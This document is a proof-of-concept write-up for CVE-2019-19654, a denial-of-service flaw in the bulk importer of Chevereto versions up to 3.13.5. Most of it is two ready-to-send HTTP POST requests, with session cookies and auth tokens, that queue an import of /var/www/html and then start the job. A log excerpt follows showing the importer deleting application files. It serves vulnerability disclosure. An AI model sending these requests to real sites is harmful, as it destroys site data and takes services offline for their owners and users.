# CVE-2019-19654
Chevereto denial of service - <= 3.13.5 Core in the /dashboard/bulk tool.
An attacker with an admin account can insert any path. The bulk importer will remove any file and folder it has access to. Basically you can make the website self-destruct.

# Add job to "import" /var/www/html

<kbd>
  <img src="/1.png?raw=true">
</kbd>

<br/>
<br/>

```
POST /json HTTP/1.1
Host: 192.168.0.88
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 117
Origin: http://192.168.0.88
DNT: 1
Connection: close
Referer: http://192.168.0.88/dashboard/bulk
Cookie: PHPSESSID=47s523u1s4m67g0vaheldg4s31; KEEP_LOGIN=I8G%3A28854bd7bb05d8f456de5afa5b560fe17705fa7da0686c8f392c2ab16359046a112bf5dc002fbc10728c86370f1f66bc141a5214312124f147ba7d28601c5cc6c4fa40f6efce41428e7c03f5f27addaf1227%3A1575670700

auth_token=f731b451467b8ff0054536127bb3ef96251054d4&action=importAdd&path=%2Fvar%2Fwww%2Fhtml&options%5Broot%5D=plain
```

# Start job, which will remove important system files and render the application unusable
```
POST /json HTTP/1.1
Host: 192.168.0.88
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 101
Origin: http://192.168.0.88
DNT: 1
Connection: close
Referer: http://192.168.0.88/dashboard/bulk
Cookie: PHPSESSID=47s523u1s4m67g0vaheldg4s31; KEEP_LOGIN=I8G%3A28854bd7bb05d8f456de5afa5b560fe17705fa7da0686c8f392c2ab16359046a112bf5dc002fbc10728c86370f1f66bc141a5214312124f147ba7d28601c5cc6c4fa40f6efce41428e7c03f5f27addaf1227%3A1575670700

auth_token=f731b451467b8ff0054536127bb3ef96251054d4&id=1&action=importEdit&values%5Bstatus%5D=working
```

# Partial log file of the process
```
1575660328 - [Thread #1] ...Removing directory /var/www/html/app/importer/jobs/9 (rmdir)
1575660328 - [Thread #1] Unable to remove /var/www/html/app/importer/jobs/9
1575660328 - [Thread #1] ...Removing directory /var/www/html/app/importer/jobs (rmdir)
1575660328 - [Thread #1] Unable to remove /var/www/html/app/importer/jobs
1575660328 - [Thread #1] ...Removing directory /var/www/html/app/importer (rmdir)
1575660328 - [Thread #1] Unable to remove /var/www/html/app/importer
1575660328 - [Thread #1] ...Removing file /var/www/html/app/.htaccess (unlink)
1575660328 - [Thread #1] ...Removing file /var/www/html/app/install/installer.php (unlink)
1575660328 - [Thread #1] ...Removing file /var/www/html/app/install/template/updated.php (unlink)
```
